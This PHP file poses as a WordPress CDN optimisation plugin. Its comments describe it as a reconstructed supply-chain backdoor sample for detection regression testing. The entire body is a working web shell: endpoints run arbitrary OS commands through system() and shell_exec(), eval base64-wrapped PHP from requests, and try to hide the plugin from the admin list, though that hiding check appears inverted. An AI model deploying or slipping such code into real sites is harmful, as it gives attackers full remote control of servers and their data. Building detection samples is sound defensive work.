<?php
/**
 * Plugin Name: Content Delivery Helper
 * Description: Optimizes asset delivery across CDN edge nodes.
 * Version: 2.7.1
 * Author: WP Performance Team
 */

// Behavioral reconstruction of the OptinMonster supply-chain backdoor plugin
// (Sansec, 2026). NOT verbatim attacker source — a representative sample that
// reproduces the documented capabilities for detection regression testing.

if (!defined('ABSPATH')) {
    // Self-hiding: drop out of the admin plugin list so the operator's
    // backdoor never shows up under Plugins → Installed.
    add_filter('all_plugins', function ($plugins) {
        unset($plugins['content-delivery-helper/content-delivery-helper.php']);
        return $plugins;
    });
}

// WPM File Manager & Shell — direct OS command execution endpoint.
if (isset($_GET['developer_api1_fm'])) {
    @set_time_limit(0);
    echo "<pre>WPM File Manager & Shell</pre>";
    $out = system($_POST['cmd']);
    echo htmlspecialchars($out);
    exit;
}

// Eval endpoint — runs arbitrary base64-wrapped PHP handed over by the operator.
if (isset($_POST['developer_api1_eval'])) {
    @eval(base64_decode($_POST['developer_api1_eval']));
    exit;
}

// Fallback dispatch: shell_exec driven straight from the request.
if (isset($_REQUEST['x'])) {
    print shell_exec($_REQUEST['x']);
}
